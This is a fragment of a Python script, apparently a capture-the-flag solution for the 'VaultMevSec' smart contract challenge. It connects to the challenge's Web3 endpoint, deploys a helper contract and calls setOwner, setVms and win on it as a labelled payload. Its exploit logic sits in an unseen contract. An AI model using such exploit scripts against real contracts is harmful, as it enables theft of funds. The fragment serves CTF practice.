...
challenge_abi = compiled['VaultMevSec.sol:VaultMevSec']['abi']
mycontract_abi = compiled['VaultMevSec.sol:MyContract']['abi']

bytes = compiled['VaultMevSec.sol:MyContract']['bin']

# connect to Web3
w3 = Web3(Web3.HTTPProvider('http://ctf.mevsec.com:50262'))
...
challenge_addr = setup_contract.functions.vms().call()
...
# payload
mycontract.functions.setOwner().transact()
mycontract.functions.setVms(challenge_addr).transact()
mycontract.functions.win().transact()
